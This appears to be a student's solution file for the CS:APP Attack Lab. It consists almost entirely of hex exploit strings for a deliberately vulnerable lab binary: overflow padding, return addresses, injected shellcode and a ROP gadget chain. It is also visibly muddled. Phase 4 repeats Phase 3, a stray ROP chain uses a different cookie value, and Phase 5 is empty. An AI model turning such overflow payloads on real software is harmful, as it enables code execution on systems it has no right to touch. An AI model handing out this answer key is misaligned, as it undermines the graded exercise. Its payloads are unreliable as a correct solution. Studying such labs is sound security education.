# Attack Lab
See assignment details at attacklab.pdf.  
See guide at https://github.com/magna25/Attack-Lab/.

## Phase 1 Solution
```
// 40 bytes
11 11 11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11 11 11
// address of touch1 (8 bytes)
74 16 40 00 00 00 00 00
```

## Phase 2 Solution
```
// injected code with total 40 bytes
48 c7 c7 1f 25 3c 37 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
// address of register and touch2
18 22 65 55 00 00 00 00
a0 16 40 00 00 00 00 00 
```

## Phase 3 Solution
```
// injected code with total 40 bytes
48 c7 c7 50 17 68 55 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
// address of register and touch3
18 22 65 55 00 00 00 00
a0 16 40 00 00 00 00 00
// cookie
33 37 33 63 32 35 31 66
```

## Phase 4 Solution
```
// injected code with total 40 bytes
48 c7 c7 50 17 68 55 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
// address of register and touch3
18 22 65 55 00 00 00 00
a0 16 40 00 00 00 00 00
// cookie
33 37 33 63 32 35 31 66
```
/* fill the buffer for the first 40 bytes */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
/* end of buffer */
d5 18 40 00 00 00 00 00 /* gadget 1: popq %rax */
6b 79 4f 5a 00 00 00 00 /* value of the cookie */
e7 18 40 00 00 00 00 00 /* gadget 2: move %rax to %rdi */
68 17 40 00 00 00 00 00 /* address of touch2() */
## Phase 5 Solution
